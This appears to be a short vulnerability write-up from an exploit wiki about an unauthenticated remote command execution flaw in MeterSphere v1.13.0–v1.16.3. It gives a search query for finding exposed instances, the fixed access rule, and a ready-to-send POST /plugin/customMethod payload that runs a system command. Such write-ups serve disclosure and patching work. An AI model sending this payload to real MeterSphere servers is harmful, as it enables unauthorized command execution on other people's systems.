# MeterSphere customMethod remote command execution vulnerability

## Vulnerability Description

On January 5, 2022, the Chuangyu 404 Active Defense Experimental Team discovered a vulnerability in the MeterSphere open source continuous testing platform and provided feedback to the MeterSphere R&D team. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">MeterSphere v1.13.0 - v1.16.3</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="MeterSphere"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1641555749774-16f5fa84-eed7-4ec7-8c9d-0daf4085f543.png)

According to the official fix, you can see that the current version of the fix is ​​a deleted code snippet

filterChainDefinitionMap.put("/plugin/**", "anon");

```go
https://github.com/metersphere/metersphere/pull/9140/files
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1641555879489-faa94a48-65aa-4eb5-b116-434b10b0895a.png)

View file **/backend/src/main/java/io/metersphere/controller/PluginController.java**

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1641556024273-44267007-49eb-46c6-b0fd-237b0fad9d74.png)

Send a request packet

```go
POST /plugin/customMethod

{"entry":"Evil","request":"id"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1641559411956-ce8b8be3-71db-4c31-95fa-d75a00adce85.png)